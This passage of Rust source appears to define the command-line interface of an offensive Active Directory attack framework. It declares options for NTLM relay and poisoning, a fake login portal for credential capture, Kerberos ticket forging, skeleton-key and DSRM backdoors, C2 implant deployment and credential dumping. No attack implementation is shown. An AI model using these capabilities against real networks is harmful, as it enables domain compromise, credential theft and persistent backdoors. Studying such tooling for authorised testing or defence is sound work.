    /// Execute SQL query on target server
    Query {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        query: String,
        #[arg(short = 'D', long, default_value = "master")]
        database: String,
    },
    /// Execute command via xp_cmdshell
    XpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        command: String,
    },
    /// Enumerate linked servers
    LinkedServers {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Enable xp_cmdshell on target
    EnableXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Check if xp_cmdshell is enabled
    CheckXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Full MSSQL security audit — checks misconfigurations, weak passwords, privilege paths
    Audit {
        /// Target SQL server(s) — comma-separated
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Audit linked servers recursively (can be slow)
        #[arg(long)]
        crawl_links: bool,
        /// Output file for audit results (JSON)
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Dump SQL credentials — passwords, service credentials, linked server logins
    DumpCredentials {
        /// Target SQL server
        #[arg(short, long, required = true)]
        target: String,
        /// Database to target (default: master)
        #[arg(short = 'D', long, default_value = "master")]
        database: String,
    },
    /// Search database content for keywords or regex patterns
    Search {
        /// Target SQL server
        #[arg(short, long, required = true)]
        target: String,
        /// Keyword to search for (case-insensitive)
        #[arg(long)]
        keyword: Option<String>,
        /// Regex pattern to match (case-insensitive)
        #[arg(long)]
        regex: Option<String>,
        /// Database to search (default: all user databases)
        #[arg(short = 'D', long)]
        database: Option<String>,
        /// Maximum rows to return per table (default: 100)
        #[arg(long, default_value = "100")]
        max_rows: usize,
    },
    /// Manage SQL Agent jobs — list, start, stop
    AgentJob {
        /// Target SQL server
        #[arg(short, long, required = true)]
        target: String,
        /// Action: list, start, stop, delete
        #[arg(short, long, default_value = "list")]
        action: String,
        /// Job name (required for start/stop/delete)
        #[arg(short, long)]
        name: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum PluginAction {
    /// List all loaded plugins
    List,
    /// Show info about a specific plugin
    Info {
        /// Plugin ID
        plugin_id: String,
    },
    /// Execute a plugin command
    Exec {
        /// Plugin command name
        command: String,
        /// Command arguments (--key value pairs)
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        args: Vec<String>,
    },
    /// Load a plugin from a file path
    Load {
        /// Path to .so/.dll/.wasm file
        path: String,
    },
    /// Unload a plugin by ID
    Unload {
        /// Plugin ID
        plugin_id: String,
    },
    /// Enable a disabled plugin
    Enable {
        /// Plugin ID
        plugin_id: String,
    },
    /// Disable a plugin without unloading
    Disable {
        /// Plugin ID
        plugin_id: String,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: C2 sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum C2Action {
    /// Connect to a C2 teamserver
    Connect {
        /// Framework: cs, sliver, havoc
        framework: String,
        /// Teamserver host
        host: String,
        /// Teamserver port
        port: u16,
        /// Password (for Cobalt Strike)
        #[arg(long)]
        password: Option<String>,
        /// Token (for Havoc)
        #[arg(long)]
        token: Option<String>,
        /// Sliver operator config file path
        #[arg(long)]
        config: Option<String>,
        /// Channel name
        #[arg(long, default_value = "default")]
        name: Option<String>,
        /// Skip TLS verification
        #[arg(long)]
        skip_verify: bool,
    },
    /// Show C2 channels and active sessions
    Status,
    /// Execute a command on a C2 session
    Exec {
        /// Session/beacon ID
        session_id: String,
        /// Command to execute
        command: String,
        /// Use PowerShell
        #[arg(long)]
        powershell: bool,
    },
    /// Deploy an implant to a target
    Deploy {
        /// C2 channel name
        channel: String,
        /// Target hostname or IP
        target: String,
        /// Listener name on the teamserver
        listener: String,
    },
    /// Disconnect from a C2 teamserver
    Disconnect {
        /// Channel name (or 'all')
        channel: String,
    },
    /// List available listeners on a C2 teamserver
    Listeners {
        /// Channel name
        channel: String,
    },
}

// ──────────────────────────────────────────────────────────
// ACL sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum AclAction {
    /// Force-change a user's password (requires ForceChangePassword extended right or GenericAll)
    ForcePassword {
        /// Target user DN or sAMAccountName
        #[arg(short, long, required = true)]
        target: String,
        /// New password to set
        #[arg(short, long, required = true)]
        password: String,
    },
    /// Add a user to a group (requires WriteProperty/member or GenericAll)
    AddMember {
        /// Group DN
        #[arg(short, long, required = true)]
        group: String,
        /// Member DN to add
        #[arg(short, long, required = true)]
        member: String,
    },
    /// Remove a user from a group
    RemoveMember {
        /// Group DN
        #[arg(short, long, required = true)]
        group: String,
        /// Member DN to remove
        #[arg(short, long, required = true)]
        member: String,
    },
    /// Grant GenericAll to a trustee on a target object (requires WriteDACL)
    WriteDacl {
        /// Target object DN
        #[arg(short, long, required = true)]
        target: String,
        /// Trustee sAMAccountName (resolved to SID automatically)
        #[arg(long, required = true)]
        trustee: String,
    },
    /// Set an SPN on a user for targeted Kerberoasting (requires WriteProperty/SPN or GenericAll)
    WriteSpn {
        /// Target user DN
        #[arg(short, long, required = true)]
        target: String,
        /// SPN to add (e.g. cifs/fake.corp.local)
        #[arg(short = 's', long, required = true)]
        spn: String,
    },
    /// Remove an SPN from a user (cleanup)
    RemoveSpn {
        /// Target user DN
        #[arg(short, long, required = true)]
        target: String,
        /// SPN to remove
        #[arg(short = 's', long, required = true)]
        spn: String,
    },
    /// Enumerate abusable ACEs for the current/specified trustee SID
    Enum {
        /// SID to check (default: current user's SID from --domain/--username)
        #[arg(long)]
        sid: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// GPO sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GpoAction {
    /// Enumerate all GPOs and their links
    Enum,
    /// Write an ImmediateTask XML to SYSVOL for code execution via Computer/User GPO
    Write {
        /// GPO name or CN (e.g. {GUID} or display name)
        #[arg(short, long, required = true)]
        gpo: String,
        /// SYSVOL share path (e.g. \\dc01.corp.local\SYSVOL\corp.local\Policies)
        #[arg(long, required = true)]
        sysvol: String,
        /// Command to execute (runs as SYSTEM for Computer GPO)
        #[arg(short, long, required = true)]
        command: String,
        /// Task name (appears in Windows Task Scheduler briefly)
        #[arg(long, default_value = "OT-Maint")]
        task_name: String,
        /// Apply to User policy directory instead of Machine
        #[arg(long)]
        user_policy: bool,
    },
    /// Remove a previously-written ImmediateTask XML (cleanup)
    Cleanup {
        /// GPO name or CN
        #[arg(short, long, required = true)]
        gpo: String,
        /// SYSVOL share path
        #[arg(long, required = true)]
        sysvol: String,
        /// Task name to remove
        #[arg(long, default_value = "OT-Maint")]
        task_name: String,
        /// Was written to User policy directory
        #[arg(long)]
        user_policy: bool,
    },
}

// ──────────────────────────────────────────────────────────
// Enumeration targets
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum EnumTarget {
    Pre,
    Anonymous,
    NullSession,
    Users,
    Computers,
    Groups,
    Trusts,
    Spns,
    Asrep,
    Delegations,
    Gpos,
    Laps,
    Policy,
    All,
}

// ──────────────────────────────────────────────────────────
// PowerView sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum PowerViewAction {
    /// List domain users
    Users {
        #[arg(long)]
        identity: Option<String>,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    /// List domain computers
    Computers {
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    /// List domain groups
    Groups {
        #[arg(long)]
        group: Option<String>,
        #[arg(long)]
        filter: Option<String>,
    },
    /// Enumerate domain trusts
    Trusts,
    /// Enumerate Service Principal Names
    Spns,
    /// Enumerate AS-REP roastable accounts
    Asrep,
    /// Enumerate constrained/unconstrained delegations
    Delegations,
    /// List Group Policy Objects
    Gpos {
        #[arg(long)]
        name: Option<String>,
    },
    /// Query default domain policy
    Policy,
    /// Read LAPS passwords
    Laps {
        #[arg(long)]
        computer: Option<String>,
    },
    /// Enumerate object ACLs
    Acls {
        #[arg(long)]
        sid: Option<String>,
    },
    /// Enumerate all objects
    All,
}

// ──────────────────────────────────────────────────────────
// GUID resolution sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GuidAction {
    /// Resolve a GUID to a human-readable name
    Resolve {
        /// GUID to resolve (e.g. 00000000-0000-0000-0000-000000000000)
        value: String,
    },
    /// List all known GUIDs, optionally filtered
    List {
        /// Optional filter text
        #[arg(long)]
        filter: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// Kerberos sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum KerberosAction {
    /// Enumerate users via Kerberos (no credentials required)
    UserEnum {
        /// Path to username wordlist
        #[arg(short = 'U', long)]
        userlist: Option<String>,
        /// Output file for valid usernames
        #[arg(short, long)]
        output: Option<String>,
        /// Delay between attempts (seconds)
        #[arg(long, default_value = "0")]
        delay: u64,
        /// Concurrency level
        #[arg(long, default_value = "10")]
        concurrency: usize,
        /// Attempt LDAP username enumeration first
        #[arg(long)]
        use_ldap: bool,
    },
    /// Kerberoast — request TGS for SPNs
    Roast {
        /// Target SPN (roast all if omitted)
        #[arg(long)]
        spn: Option<String>,
        /// Downgrade to RC4 (etype 23) for offline cracking
        #[arg(long)]
        downgrade_rc4: bool,
    },
    /// AS-REP roast — request AS-REP for users without pre-authentication
    AsrepRoast {
        /// Path to user list
        #[arg(short = 'U', long)]
        userlist: Option<String>,
    },
    /// Request a TGS service ticket
    GetTgs {
        /// Service Principal Name
        #[arg(short, long, required = true)]
        spn: String,
    },
    /// Request a TGT (requires credentials or NT hash)
    GetTgt,
}

// ──────────────────────────────────────────────────────────
// Shadow Credential sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum ShadowCredAction {
    /// Add a new KeyCredentialLink entry on the target object
    Add {
        /// Target DN or sAMAccountName
        #[arg(required = true)]
        target: String,
        /// Key size in bits (default: 2048)
        #[arg(long, default_value = "2048")]
        key_size: u16,
        /// Certificate validity in hours (default: 8760 = 1 year)
        #[arg(long, default_value = "8760")]
        validity_hours: u16,
    },
    /// List existing KeyCredentialLink entries on the target object
    List {
        /// Target DN or sAMAccountName
        #[arg(required = true)]
        target: String,
    },
    /// Remove a specific KeyCredentialLink entry by KeyId
    Remove {
        /// Target DN or sAMAccountName
        #[arg(required = true)]
        target: String,
        /// Key ID of the credential to remove (from `list` output)
        #[arg(long, required = true)]
        key_id: String,
    },
    /// Remove all KeyCredentialLink entries from the target object
    Clear {
        /// Target DN or sAMAccountName
        #[arg(required = true)]
        target: String,
        /// Skip confirmation prompt
        #[arg(long)]
        force: bool,
    },
}

// ──────────────────────────────────────────────────────────
// SMB sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum SmbAction {
    /// List SMB shares with read/write access
    Shares {
        /// Target hostname or IP
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Check admin access on remote hosts
    Admin {
        /// Comma-separated target hosts
        #[arg(short, long, required = true)]
        targets: String,
    },
    /// Spider SMB shares for interesting files
    Spider {
        /// Target hostname or IP
        #[arg(short, long, required = true)]
        target: String,
        /// File extensions to search for (comma-separated, e.g. .txt,.docx)
        #[arg(
            short,
            long,
            default_value = ".txt,.docx,.xlsx,.pdf,.csv,.cfg,.ps1,.xml,.ini,.kdbx,.rdp,.vmdk,.vhdx,.pst,.ost"
        )]
        extensions: String,
        /// Keyword to search inside file contents (case-insensitive)
        #[arg(long)]
        grep: Option<String>,
        /// Regex pattern to match inside file contents
        #[arg(long)]
        regex: Option<String>,
        /// Download matched files to this directory
        #[arg(long)]
        output_dir: Option<String>,
        /// Maximum recursion depth (default: 10)
        #[arg(long, default_value = "10")]
        max_depth: usize,
    },
    /// Download a file from an SMB share
    Get {
        /// Target hostname or IP
        #[arg(short, long, required = true)]
        target: String,
        /// Remote file path (UNC format or share-relative)
        #[arg(short, long, required = true)]
        path: String,
    },
    /// Upload a file to an SMB share
    Put {
        /// Target hostname or IP
        #[arg(short, long, required = true)]
        target: String,
        /// Local file path
        #[arg(short, long, required = true)]
        local: String,
        /// Remote file path
        #[arg(short, long, required = true)]
        remote: String,
    },
}

// ──────────────────────────────────────────────────────────
// Dump source enum
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum DumpSource {
    Sam,
    Lsa,
    Ntds,
    Dcc2,
}

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum DumpLsassMethod {
    /// Auto-select: try MiniDump first, fall back to direct read
    Auto,
    /// In-process comsvcs.dll MiniDumpW (avoids rundll32.exe)
    MiniDump,
    /// Direct NtReadVirtualMemory page walk (no DLL loaded)
    Direct,
}

// ──────────────────────────────────────────────────────────
// NTLM relay sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum NtlmAction {
    /// LLMNR/NBT-NS/mDNS responder for credential capture
    Capture {
        /// Network interface to listen on
        #[arg(short, long, default_value = "eth0")]
        interface: String,
        /// Listener port
        #[arg(long, default_value = "0")]
        port: u16,
        /// Disable all poisoning (capture only mode)
        #[arg(long)]
        no_poison: bool,
        /// Enable mitm6 DHCPv6 poisoning
        #[arg(long)]
        mitm6: bool,
        /// Enable mDNS poisoning (default: disabled)
        #[arg(long)]
        mdns: bool,
        /// Enable LLMNR poisoning (default: enabled)
        #[arg(long, default_value_t = true)]
        llmnr: bool,
        /// Enable NBT-NS poisoning (default: enabled)
        #[arg(long, default_value_t = true)]
        nbtns: bool,
        /// Passive analysis mode — log queries without poisoning
        #[arg(long)]
        analyze: bool,
        /// IP address to use in poisoned responses
        #[arg(long)]
        poison_ip: Option<String>,
        /// WPAD proxy URL (e.g., http://192.168.1.5:8080) or PAC script path
        #[arg(long)]
        wpad: Option<String>,
        /// SOCKS5 proxy for outbound connections (e.g. socks5://127.0.0.1:9050)
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// Generic NTLM relay to target
    Relay {
        /// Target hosts for relay
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Listener port
        #[arg(long, default_value = "0")]
        port: u16,
        /// Command to execute on targets (if SMB)
        #[arg(short, long)]
        command: Option<String>,
        /// Disable LLMNR/NBT-NS poisoning
        #[arg(long)]
        no_poison: bool,
        /// Enable mitm6 DHCPv6 poisoning
        #[arg(long)]
        mitm6: bool,
        /// Attempt LDAP signing bypass
        #[arg(long)]
        ldap_signing_bypass: bool,
        /// Hosts to coerce into authenticating (comma-separated)
        #[arg(long, value_delimiter = ',')]
        auto_coerce_targets: Vec<String>,
        /// Listener IP for coerced connections
        #[arg(long)]
        auto_coerce_listener: Option<String>,
        /// Domain for authenticated coercion triggers (default: null session)
        #[arg(long)]
        auto_coerce_domain: Option<String>,
        /// Username for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_user: Option<String>,
        /// Password for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_password: Option<String>,
        /// mTLS client certificate PEM file path
        #[arg(long)]
        tls_client_cert: Option<String>,
        /// mTLS client private key PEM file path
        #[arg(long)]
        tls_client_key: Option<String>,
        /// Validate TLS server certificates (non-relay/auditing mode)
        #[arg(long)]
        tls_verify: bool,
        /// SOCKS5 proxy address (host:port)
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// NTLM relay via SMB protocol
    SmbRelay {
        /// Target hosts for relay
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Listener port
        #[arg(long, default_value = "0")]
        port: u16,
        /// Command to execute on targets
        #[arg(short, long)]
        command: Option<String>,
        /// Enable mitm6 DHCPv6 poisoning
        #[arg(long)]
        mitm6: bool,
        /// Attempt LDAP signing bypass
        #[arg(long)]
        ldap_signing_bypass: bool,
        /// Hosts to coerce into authenticating (comma-separated)
        #[arg(long, value_delimiter = ',')]
        auto_coerce_targets: Vec<String>,
        /// Listener IP for coerced connections
        #[arg(long)]
        auto_coerce_listener: Option<String>,
        /// Domain for authenticated coercion triggers (default: null session)
        #[arg(long)]
        auto_coerce_domain: Option<String>,
        /// Username for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_user: Option<String>,
        /// Password for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_password: Option<String>,
        /// mTLS client certificate PEM file path
        #[arg(long)]
        tls_client_cert: Option<String>,
        /// mTLS client private key PEM file path
        #[arg(long)]
        tls_client_key: Option<String>,
        /// Validate TLS server certificates (non-relay/auditing mode)
        #[arg(long)]
        tls_verify: bool,
        /// SOCKS5 proxy address (host:port)
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// NTLM relay via HTTP protocol
    HttpRelay {
        /// Target hosts for relay
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Listener port
        #[arg(long, default_value = "0")]
        port: u16,
        /// Command to execute on targets
        #[arg(short, long)]
        command: Option<String>,
        /// Enable mitm6 DHCPv6 poisoning
        #[arg(long)]
        mitm6: bool,
        /// Attempt LDAP signing bypass
        #[arg(long)]
        ldap_signing_bypass: bool,
        /// Hosts to coerce into authenticating (comma-separated)
        #[arg(long, value_delimiter = ',')]
        auto_coerce_targets: Vec<String>,
        /// Listener IP for coerced connections
        #[arg(long)]
        auto_coerce_listener: Option<String>,
        /// Domain for authenticated coercion triggers (default: null session)
        #[arg(long)]
        auto_coerce_domain: Option<String>,
        /// Username for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_user: Option<String>,
        /// Password for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_password: Option<String>,
        /// mTLS client certificate PEM file path
        #[arg(long)]
        tls_client_cert: Option<String>,
        /// mTLS client private key PEM file path
        #[arg(long)]
        tls_client_key: Option<String>,
        /// Validate TLS server certificates (non-relay/auditing mode)
        #[arg(long)]
        tls_verify: bool,
        /// SOCKS5 proxy for outbound connections
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// Enhanced HTTP asymmetric relay — full request capture and replay
    HttpAsymmetric {
        /// Target hosts for relay (e.g., smb://10.0.0.1:445, http://10.0.0.2:80)
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// HTTP listener port
        #[arg(long, default_value = "80")]
        port: u16,
        /// Network interface to listen on
        #[arg(short, long, default_value = "0.0.0.0")]
        interface: String,
        /// SOCKS5 proxy for outbound connections
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// NTLM relay via LDAP with GSS-SPNEGO bypass
    LdapRelay {
        /// Target host IP
        #[arg(short, long, required = true)]
        target: String,
        /// Listener port
        #[arg(long, default_value = "389")]
        port: u16,
        /// Use LDAPS
        #[arg(long)]
        ldaps: bool,
        /// Disable LDAP signing bypass
        #[arg(long)]
        no_signing_bypass: bool,
        /// Hosts to coerce into authenticating (comma-separated)
        #[arg(long, value_delimiter = ',')]
        auto_coerce_targets: Vec<String>,
        /// Listener IP for coerced connections
        #[arg(long)]
        auto_coerce_listener: Option<String>,
        /// Domain for authenticated coercion triggers (default: null session)
        #[arg(long)]
        auto_coerce_domain: Option<String>,
        /// Username for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_user: Option<String>,
        /// Password for authenticated coercion triggers
        #[arg(long)]
        auto_coerce_password: Option<String>,
        /// mTLS client certificate PEM file path
        #[arg(long)]
        tls_client_cert: Option<String>,
        /// mTLS client private key PEM file path
        #[arg(long)]
        tls_client_key: Option<String>,
        /// Validate TLS server certificates (non-relay/auditing mode)
        #[arg(long)]
        tls_verify: bool,
        /// SOCKS5 proxy for outbound connections
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// Standalone SMB daemon for credential capture
    SmbDaemon {
        /// Network interface to listen on
        #[arg(short, long, default_value = "eth0")]
        interface: String,
        /// Listener port
        #[arg(long, default_value = "445")]
        port: u16,
    },
    /// TLS-wrapped NTLM relay with optional mTLS client certificate verification
    TlsRelay {
        /// Target hosts for relay (e.g., smb://10.0.0.1:445, ldap://10.0.0.2:389)
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// TLS listener port (typically 443 for HTTPS relay)
        #[arg(long, default_value = "443")]
        port: u16,
        /// Network interface to listen on
        #[arg(short, long, default_value = "0.0.0.0")]
        interface: String,
        /// PEM-encoded TLS certificate file path
        #[arg(long, required = true)]
        tls_cert: String,
        /// PEM-encoded TLS private key file path
        #[arg(long, required = true)]
        tls_key: String,
        /// PEM-encoded CA certificate for mTLS client verification (optional)
        #[arg(long)]
        mtls_client_ca: Option<String>,
        /// Channel binding token mode: "strip", "passthrough", or "validate"
        #[arg(long, default_value = "strip")]
        cbt_mode: String,
        /// SOCKS5 proxy for outbound relay connections
        #[arg(long)]
        socks5_proxy: Option<String>,
    },
    /// NTLM relay via Exchange (EWS/MAPI)
    Exchange {
        /// Target Exchange server
        #[arg(short, long, required = true)]
        target: String,
        /// Exchange listener port
        #[arg(long, default_value = "443")]
        port: u16,
        /// Disable TLS
        #[arg(long)]
        no_tls: bool,
        /// EWS path
        #[arg(long, default_value = "/EWS/Exchange.asmx")]
        ews_path: String,
        /// MAPI path
        #[arg(long, default_value = "/mapi/")]
        mapi_path: String,
        /// Prefer MAPI over EWS
        #[arg(long)]
        prefer_mapi: bool,
        /// Exchange version
        #[arg(long, default_value = "2019")]
        version: String,
        /// mTLS client certificate PEM file path
        #[arg(long)]
        tls_client_cert: Option<String>,
        /// mTLS client private key PEM file path
        #[arg(long)]
        tls_client_key: Option<String>,
        /// Validate TLS server certificates (non-relay/auditing mode)
        #[arg(long)]
        tls_verify: bool,
        /// SOCKS5 proxy for outbound connections (e.g. socks5://127.0.0.1:9050)
        #[arg(long)]
        socks5_proxy: Option<String>,
    },

    /// Captive portal — serve fake login pages for form-based credential capture
    CaptivePortal {
        /// Port to serve the captive portal on
        #[arg(long, default_value = "8080")]
        port: u16,
        /// Network interface to listen on
        #[arg(short, long, default_value = "0.0.0.0")]
        interface: String,
        /// Portal template style (generic, office365, adfs)
        #[arg(long, default_value = "generic")]
        template: String,
        /// Company name displayed on the login page
        #[arg(long, default_value = "IT Department")]
        company: String,
        /// Target URL to redirect victims to after login
        #[arg(long)]
        redirect_url: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// Forge sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum ForgeAction {
    /// Forge a Golden Ticket (krbtgt)
    Golden {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// Username to impersonate
        #[arg(short, long, default_value = "Administrator")]
        user: String,
        /// RID of the user (default: 500 = Administrator)
        #[arg(long, default_value = "500")]
        rid: u32,
        /// krbtgt RC4 hash (32 hex chars)
        #[arg(long, required = true)]
        krbtgt_hash: String,
        /// Output file for the forged ticket
        #[arg(short, long, default_value = "golden.kirbi")]
        output: String,
    },
    /// Forge a Silver Ticket (service)
    Silver {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// Username to impersonate
        #[arg(short, long, default_value = "Administrator")]
        user: String,
        /// RID of the user (default: 500 = Administrator)
        #[arg(long, default_value = "500")]
        rid: u32,
        /// Target SPN (e.g. cifs/dc01.corp.local)
        #[arg(short, long, required = true)]
        spn: String,
        /// Service RC4 hash (32 hex chars)
        #[arg(long, required = true)]
        service_hash: String,
        /// Output file for the forged ticket
        #[arg(short, long, default_value = "silver.kirbi")]
        output: String,
    },
    /// Forge a Diamond Ticket (modify legitimate TGT PAC)
    Diamond {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// Username to impersonate
        #[arg(short, long, default_value = "Administrator")]
        user: String,
        /// RID of the user (default: 500 = Administrator)
        #[arg(long, default_value = "500")]
        rid: u32,
        /// krbtgt RC4 hash (32 hex chars)
        #[arg(long, required = true)]
        krbtgt_hash: String,
        /// krbtgt AES256 key (64 hex chars)
        #[arg(long)]
        krbtgt_aes256: Option<String>,
        /// Output file for the forged ticket
        #[arg(short, long, default_value = "diamond.kirbi")]
        output: String,
    },
    /// Forge a Sapphire Ticket (KDC-issued PAC bypass)
    Sapphire {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// Username to impersonate
        #[arg(short, long, default_value = "Administrator")]
        user: String,
        /// Output file for the forged ticket
        #[arg(short, long, default_value = "sapphire.kirbi")]
        output: String,
    },
    /// Bronze Bit (CVE-2020-17049) — S4U2Proxy forwardable flag bypass
    BronzeBit {
        /// Target SPN (e.g. cifs/dc01.corp.local)
        #[arg(short, long, required = true)]
        spn: String,
        /// Output file
        #[arg(short, long, default_value = "bronzebit.kirbi")]
        output: String,
    },
    /// Inter-realm TGT
    InterRealmTgt {
        /// Target domain FQDN
        #[arg(short, long, required = true)]
        target_domain: String,
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// krbtgt RC4 hash (32 hex chars)
        #[arg(long, required = true)]
        krbtgt_hash: String,
        /// Output file
        #[arg(short, long, default_value = "interrealm.kirbi")]
        output: String,
    },
    /// Skeleton Key — LSASS patching orchestration
    SkeletonKey {
        /// Path to payload binary (e.g. mimikatz.exe)
        #[arg(long)]
        payload_path: Option<String>,
        /// Master password for skeleton key
        #[arg(long, default_value = "overthrone")]
        master_password: String,
    },
    /// DSRM Backdoor — sync DSRM password with domain account
    DsrmBackdoor {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// krbtgt RC4 hash (32 hex chars)
        #[arg(long, required = true)]
        krbtgt_hash: String,
    },
    /// DCSync specific user
    DcSyncUser {
        /// User to DCSync
        #[arg(short, long, required = true)]
        user: String,
    },
    /// ACL Backdoor — inject DCSync rights
    AclBackdoor {
        /// Target distinguished name
        #[arg(long, required = true)]
        target_dn: String,
        /// Trustee account
        #[arg(long, required = true)]
        trustee: String,
    },
    /// noPac (CVE-2021-42278 / CVE-2021-42287)
    NoPac {
        /// Target DC hostname
        #[arg(short, long, required = true)]
        target_dc: String,
    },
    /// Convert ticket format (kirbi/ccache/base64)
    ConvertTicket {
        /// Input file path
        #[arg(short, long, required = true)]
        input: String,
        /// Output format: kirbi, ccache, base64
        #[arg(short, long, required = true)]
        format: String,
    },
    /// Convert a cracked AS-REP roast password into a usable TGT.
    /// If --hash is provided, the username and domain are auto-extracted from the hash.
    /// Ticket is saved to --output or auto-named in the current directory.
    AsRepToTgt {
        /// Cracked plaintext password from AS-REP roast
        #[arg(short, long, required = true)]
        cracked_password: String,
        /// Raw $krb5asrep$ hash — auto-fills username/domain
        #[arg(long)]
        hash: Option<String>,
        /// Path to save the ticket (.kirbi)
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Forge a TGT offline from cracked AS-REP password (no KDC contact)
    AsRepToTgtOffline {
        /// Cracked plaintext password from AS-REP roast
        #[arg(short, long, required = true)]
        cracked_password: String,
        /// Domain SID (S-1-5-21-...)
        #[arg(long, required = true)]
        domain_sid: String,
        /// User RID (default: 500)
        #[arg(long, default_value = "500")]
        user_rid: u32,
    },
    /// Interactive forge REPL - persistent ticket forging session
    Shell {
        /// Domain SID
        #[arg(long, required = true)]
        domain_sid: String,
        /// krbtgt hash (RC4 or AES256)
        #[arg(long, required = true)]
        krbtgt_hash: String,
        /// krbtgt AES256 key (optional, for Diamond tickets)
        #[arg(long)]
        krbtgt_aes256: Option<String>,
        /// Default username to impersonate
        #[arg(short, long, default_value = "Administrator")]
        user: String,
        /// Default RID to use
        #[arg(long, default_value = "500")]
        rid: u32,
    },
}

// ──────────────────────────────────────────────────────────
// Lateral movement sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum MoveAction {
    /// Enumerate domain trusts
    Trusts,
    /// Find cross-domain escalation paths
    Escalation,
    /// Analyze MSSQL linked server chains for lateral movement
    Mssql,
    /// Generate ASCII trust map
    Map,
}

// ──────────────────────────────────────────────────────────
// BloodHound attack path analysis sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum BloodHoundAction {
    /// Import SharpHound v2 JSON files from a directory into an attack graph
    Import {
        /// Directory containing BloodHound JSON files (*_users.json, *_computers.json, etc.)
        dir: String,
        /// Output file for the serialized attack graph (.json)
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Find shortest attack path between two nodes
    Path {
        /// Source node (name@domain)
        from: String,
        /// Target node (name@domain)
        to: String,
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
    },
    /// Find all paths to Domain Admin from a starting node
    PathToDa {
        /// Source node (name@domain)
        from: String,
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
    },
    /// Show graph statistics
    Stats {
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
    },
    /// Find what targets are reachable from a starting node
    Reachable {
        /// Source node (name@domain)
        from: String,
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
    },
    /// List high-value targets ranked by graph centrality
    HighValue {
        /// Number of top targets to show
        #[arg(long, default_value = "10")]
        top: usize,
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
    },
    /// Run all pre-built BloodHound-style queries and produce a comprehensive analysis report
    Analyze {
        /// Path to a serialized attack graph JSON file
        #[arg(short, long)]
        graph: String,
        /// Target domain for DA path analysis
        #[arg(long, default_value = "corp.local")]
        domain: String,
        /// Max number of cheapest DA paths to include
        #[arg(long, default_value_t = 25)]
        limit: usize,
        /// Output file for JSON report (optional)
        #[arg(short, long)]
        output: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// Offline secrets dumping sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum SecretsAction {
